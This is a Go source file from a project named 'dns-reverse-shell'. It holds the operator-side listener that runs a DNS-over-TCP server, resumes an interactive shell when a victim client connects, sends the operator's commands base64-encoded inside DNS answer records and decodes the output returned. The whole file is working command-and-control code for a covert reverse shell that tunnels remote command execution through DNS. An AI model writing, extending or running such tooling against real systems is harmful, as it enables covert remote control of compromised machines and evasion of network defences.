package listener

import (
	"dns-reverse-shell/main/encoder"
	"dns-reverse-shell/main/protocol"
	"fmt"
	"github.com/miekg/dns"
)

// todo: wait for connection before console?
type dnsHandler struct {
	server *DNSServer
}

func newDnsHandler(s *DNSServer) *dnsHandler {
	return &dnsHandler{server: s}
}

type DNSServer struct {
	port               string
	handler            *dnsHandler
	interactionHandler *interactionHandler
	connectionHandler  *connectionHandler
	messageHandler     *protocol.MessageHandler
}

func NewDnsServer(port string) *DNSServer {
	d := &DNSServer{port: port, interactionHandler: newInteractionHandler(), connectionHandler: newConnectionHandler()}
	d.handler = newDnsHandler(d)
	d.messageHandler = protocol.NewMessageHandler(encoder.NewBase64Encoder(), protocol.NewSimpleMessageSplitter())
	return d
}

func (s *DNSServer) Initialize() {
	server := s.createServer()
	fmt.Println("Starting Listener on port '" + s.port + "'")
	go s.interactionHandler.init()
	err := server.ListenAndServe()
	if err != nil {
		fmt.Printf("Failed to start listener: %s\n", err.Error())
	}
}

func (s *DNSServer) createServer() *dns.Server {
	return &dns.Server{
		Addr:      ":" + s.port,
		Net:       "tcp",
		Handler:   s.handler,
		ReusePort: true,
	}
}

func (h *dnsHandler) ServeDNS(w dns.ResponseWriter, r *dns.Msg) {
	if !h.server.connectionHandler.hasConnection {
		//todo: print client addr here
		h.server.connectionHandler.setConnectionStatus(true)
		h.server.interactionHandler.shell.Resume()
	}
	msg := h.server.createAnswerMessage(r)
	h.server.writeMessage(w, msg)
}

func (s *DNSServer) createAnswerMessage(r *dns.Msg) *dns.Msg {
	msg := s.messageHandler.CreateAnswerMessage(r)
	for _, question := range r.Question {
		command := s.interactionHandler.switchCommand(question.Name, func() string {
			return s.messageHandler.DecodeAnswerMsg(r)
		}, func() { s.connectionHandler.hasConnection = false })
		msg.Extra = s.messageHandler.BuildDNSExtra(command)
	}
	return msg
}

func (s *DNSServer) writeMessage(w dns.ResponseWriter, msg *dns.Msg) {
	err := w.WriteMsg(msg)
	if err != nil {
		fmt.Println(err)
		return
	}
}
